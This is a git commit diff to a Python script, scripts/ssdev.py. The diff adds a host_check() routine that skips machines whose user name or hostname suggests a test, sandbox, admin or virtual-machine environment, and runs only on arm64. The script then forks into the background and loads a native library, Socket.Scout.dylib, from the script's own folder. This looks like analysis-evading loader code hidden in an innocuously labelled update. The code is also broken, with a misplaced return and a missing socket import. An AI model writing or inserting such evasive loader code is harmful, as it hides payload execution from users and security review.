6b493257da248ab388bdf3c45d97330bc59af0a5
socket-sec <matthewpitcher36@gmail.com>
2025-09-26 10:58:38 -0600

    Update script

--- scripts/ssdev.py
+++ scripts/ssdev.py
@@ -1,8 +1,31 @@
 #!/usr/bin/env python3
 from ctypes import *
 import os
+import platform
+import getpass
+
+def host_check():
+    if platform.machine().lower() not in ['arm64', 'aarch64']:
+        return False
+
+    user = getpass.getuser().lower()
+    if any(x in user for x in ['test', 'admin', 'demo', 'sandbox', 'ruby']):
+        return False
+
+    try:
+        hostname = socket.gethostname().lower()
+        if any(x in hostname for x in ['test', 'vm', 'sandbox', 'virtual-machine']):
+            return False
+    except:
+        pass
+    
+return True
+
 
 def ScoutStart():
+    if not host_check():
+        return
+        
     if os.fork() > 0:
         return
     
@@ -11,9 +34,7 @@ def ScoutStart():
         os._exit(0)
 
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    parent_dir = os.path.dirname(script_dir)
-    libexec_dir = os.path.join(parent_dir,"libexec")
-    file_path = os.path.join(libexec_dir, 'Socket.Scout.dylib')
+    file_path =  os.path.join(script_dir, "Socket.Scout.dylib")
 
     s = cdll.LoadLibrary(file_path)
     s.ScoutStart()
